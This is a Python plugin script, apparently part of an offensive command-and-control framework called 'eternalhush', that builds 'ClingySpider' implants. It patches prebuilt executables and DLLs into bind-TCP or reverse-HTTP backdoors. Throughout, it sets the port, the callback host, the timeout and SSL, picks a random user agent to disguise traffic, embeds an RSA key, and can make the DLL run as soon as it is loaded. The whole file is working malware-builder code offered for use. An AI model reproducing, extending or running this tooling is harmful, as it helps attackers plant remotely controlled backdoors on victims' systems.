import eternalhush as eh
import os
import datetime
import fake_useragent

CONFIG_MAGIC = 0x99c72f6099c72f60
RSA_MAGIC = 0x52534131
RSA_MAGIC_PRIVATE = 0x52534133
PAYLOAD_DIRECT =  0
PAYLOAD_REVERSE = 1
X64_ARCH = 0x8
X32_ARCH = 0x4

implant_types = {
    1: "Bind TCP x86 executable",
    2: "Bind TCP x64 executable",
    3: "Bind TCP x86 dynamic library",
    4: "Bind TCP x64 dynamic library",
    5: "Reverse HTTP x86 executable",
    6: "Reverse HTTP x64 executable",
    7: "Reverse HTTP x86 dynamic library",
    8: "Reverse HTTP x64 dynamic library"
}

CONFIG = {
    "magic_value": eh.LONGLONG,
    "port": eh.SHORT,
    "id": eh.LONG,
    "host": 16,
    "timeout": eh.LONG,
    "useragent": 256,
    "payload_type": eh.SHORT,
    "http_use_ssl": eh.SHORT,
    "dll_attached_run": eh.SHORT
}    

RSA_KEY = {
    "public_key": 283
}    

def read_rsa_key(key_path):
    keyset = eh.ui.QueryKeyStorage()
    for ke in keyset:
        if ke['name'] == key_path:
            public_key = bytes.fromhex(ke['data'])
            if public_key[0:4] == RSA_MAGIC.to_bytes(eh.LONG, "big"):
                return public_key
            else:
                eh.ui.Echo(f"Invalid RSA publickey '{key_path}'", eh.ECHO_ERROR)
                return
    eh.ui.Echo(f"Key '{key_path}' not exists in keystorage", eh.ECHO_ERROR)

def read_rsa_private_key(key_path):
    keyset = eh.ui.QueryKeyStorage()
    for ke in keyset:
        if ke['name'] == key_path:
            public_key = bytes.fromhex(ke['data2'])
            if public_key[0:4] == RSA_MAGIC_PRIVATE.to_bytes(eh.LONG, "big"):
                return public_key
            else:
                eh.ui.Echo(f"Invalid RSA privatekey '{key_path}'", eh.ECHO_ERROR)
                return
    eh.ui.Echo(f"Key '{key_path}' not exists in keystorage", eh.ECHO_ERROR)

def main(args):
    if args.type == None:
        eh.ui.Echo("Available payloads:", eh.ECHO_DEFAULT)
        for id, key in implant_types.items():
            eh.ui.Echo("    {}) - {}".format(id, key), eh.ECHO_DEFAULT)

        while True:
            implant_type = eh.ui.Dialog("Pick payload type:", type=eh.INT)
            if implant_type in implant_types.keys():
                break
            eh.ui.Echo("Invalid option", eh.ECHO_ERROR)
    else:
        implant_type = args.type

    if implant_type == 1:
        result = patch(os.path.join(eh.FILEDIR, "X32_ClSp_Tcp_Exe.exe"), "bind_tcp", args)
    elif implant_type == 2:
        result = patch(os.path.join(eh.FILEDIR, "X64_ClSp_Tcp_Exe.exe"), "bind_tcp", args)
    elif implant_type == 3:
        result = patch(os.path.join(eh.FILEDIR, "X32_ClSp_Tcp_Dll.dll"), "bind_tcp", args)
    elif implant_type == 4:
        result = patch(os.path.join(eh.FILEDIR, "X64_ClSp_Tcp_Dll.dll"), "bind_tcp", args)
    elif implant_type == 5:
        result = patch(os.path.join(eh.FILEDIR, "X32_ClSp_Http_Exe.exe"), "reverse_http", args)  
    elif implant_type == 6:
        result = patch(os.path.join(eh.FILEDIR, "X64_ClSp_Http_Exe.exe"), "reverse_http", args)
    elif implant_type == 7:
        result = patch(os.path.join(eh.FILEDIR, "X32_ClSp_Http_Dll.dll"), "reverse_http", args)  
    elif implant_type == 8:
        result = patch(os.path.join(eh.FILEDIR, "X64_ClSp_Http_Dll.dll"), "reverse_http", args)
        
def not_implemented():
    eh.ui.Echo("Type not implemented yet", eh.ECHO_ERROR)
    return
    
def patch(name, type, args):
    key_path = None
    eh.ui.Echo("Patching implant stub", eh.ECHO_DEFAULT)
    if "reverse" in type:
    	implant_type = PAYLOAD_REVERSE
    elif "bind" in type:
    	implant_type = PAYLOAD_DIRECT
    
    if args.id == None:
        id = eh.ui.Dialog("Enter the implant id", type=eh.INT, default=0)
    else:
        id = args.id
    if args.port == None:
        port = eh.ui.Dialog("Enter the implant listening port",  type=eh.INT, default=1287)
    else:
        port = args.port

    #if args.genkey == None and args.pubkey == None:
    if args.pubkey == None:
        eh.ui.Echo("Available keys:", eh.ECHO_DEFAULT)
        keyset = eh.ui.QueryKeyStorage()
        keyc = 0
        for ke in keyset:
            eh.ui.Echo(f"{keyc}) {ke['name']}", eh.ECHO_DEFAULT)
            keyc += 1
        eh.ui.Echo(f"{keyc}) Generate New Key", eh.ECHO_DEFAULT)
        eh.ui.Echo(f"", eh.ECHO_DEFAULT)
        keynum = eh.ui.Dialog("Select Key", type=eh.INT)
        if keynum == keyc:            
            key_path = eh.ui.Dialog("Enter the name for new keypair")
            eh.ui.Run("!keygen -algorithm rsa2048 -name " + key_path, eh.RUN_NORMAL)    
            public_key = read_rsa_key(key_path)
        else:
            key_path = keyset[keynum]['name']
            public_key = read_rsa_key(key_path)
        if not public_key:
            return
    #elif args.pubkey == None:
    #    key_path = args.genkey
    #    eh.ui.Run("!keygen -path " + key_path, eh.RUN_SILENT)
    #    key_path = os.path.join(key_path, "public.key")
    #    public_key = read_rsa_key(key_path)
    #    if not public_key:
    #        return
    else:
        key_path = args.pubkey
        public_key = read_rsa_key(key_path)
        if not public_key:
            return
    
    try:
        with open(name, "rb") as f:
            content = f.read()
            content = bytearray(content)
    except IOError:
        eh.ui.Echo("Error while opening the file", eh.ECHO_ERROR)
        return    
    
    magic_val = content.find(CONFIG_MAGIC.to_bytes(eh.LONGLONG, "little"))

    if magic_val > 0:
        config = eh.data.Struct(CONFIG)
        config.from_bytes(content, global_offset=magic_val)
        config.magic_value = bytearray(os.urandom(eh.LONGLONG))
        config.port = port
        config.id = id

        if name.endswith(".dll"):
            if args.run_on_attach == None:
                result = eh.ui.Option("Perform immediate DLL launch? (DllMain.DLL_PROCESS_ATTACH)", default=eh.OPTION_NO)
                if result == eh.OPTION_YES:
                    config.dll_attached_run = 1
                elif result == eh.OPTION_NO:
                    config.dll_attached_run = 0
            else:
                if args.run_on_attach.lower() == "yes":
                    config.dll_attached_run = 1
                elif args.run_on_attach.lower() == "no":
                    config.dll_attached_run = 0
                else:
                    eh.ui.Echo("Invalid argument '-run_on_attach' value", eh.ECHO_ERROR)
                    return False

        if type == "reverse_http":
            if args.host == None:
                config.host = eh.ui.Dialog("Enter reverse host")
            else:
                config.host = args.host
            if args.timeout == None:
                config.timeout = eh.ui.Dialog("Enter timeout in seconds", type=eh.INT, default=60) * 1000 + 5000
            else:
                config.timeout = args.timeout * 1000 + 5000
            if not args.random_useragent and not args.useragent:
                if eh.ui.Option("Do you want to generate random useragent?", default=eh.OPTION_YES) == eh.OPTION_YES:
                    ua = fake_useragent.UserAgent().random
                else:
                    ua = eh.ui.Dialog("Enter useragent")
            elif args.random_useragent:
                ua = fake_useragent.UserAgent().random
            else:
                ua = args.useragent
            config.useragent = ua
            if args.use_ssl == None:
                result = eh.ui.Option("Do you want to use SSL TLS?", default=eh.OPTION_NO)
                if result == eh.OPTION_YES:
                    config.http_use_ssl = 1
                elif result == eh.OPTION_NO:
                    config.http_use_ssl = 0
            else:
                if args.use_ssl.lower() == "yes":
                    config.http_use_ssl = 1
                elif args.use_ssl.lower() == "no":
                    config.http_use_ssl = 0
                else:
                    eh.ui.Echo("Invalid argument '-use_ssl' value", eh.ECHO_ERROR)
                    return False

        config.payload_type = implant_type

        
    rsa_magic_val = content.find(RSA_MAGIC.to_bytes(eh.LONG, "big")) 
    if rsa_magic_val > 0:
        rsa_publickey = eh.data.Struct(RSA_KEY)
        rsa_publickey.from_bytes(config.full_data(), global_offset=rsa_magic_val)
        rsa_publickey.public_key = public_key
        try:
            dt = datetime.datetime.now()
            current_time = dt.strftime("%Y_%m_%d_%Hh%Mm%Ss")
            out_path = os.path.join(eh.ui.GetGlobalEnv("OPERATION_PATH"), "storage/ClingySpider_"+current_time)
            os.makedirs(out_path)
            original_path = out_path
            out_path = os.path.join(out_path, "ClingySpider.configured")
            with open(out_path, "wb+") as f:
                wr_bytes = f.write(rsa_publickey.full_data())
                eh.ui.Echo("Configured implant at {}".format(out_path), eh.ECHO_GOOD)
                eh.ui.Echo("Written {} bytes".format(wr_bytes), eh.ECHO_GOOD)
            with open(os.path.join(original_path, "private.key"), "wb+") as f:
                f.write(read_rsa_private_key(key_path))
            with open(os.path.join(original_path, "public.key"), "wb+") as f:
                f.write(read_rsa_key(key_path))
        except IOError:
            eh.ui.Echo("Error while opening the file "+ out_path, eh.ECHO_ERROR)
            return False
    
    return True


